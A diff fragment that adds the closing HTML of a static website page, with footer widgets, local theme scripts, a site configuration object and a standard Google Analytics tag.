+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
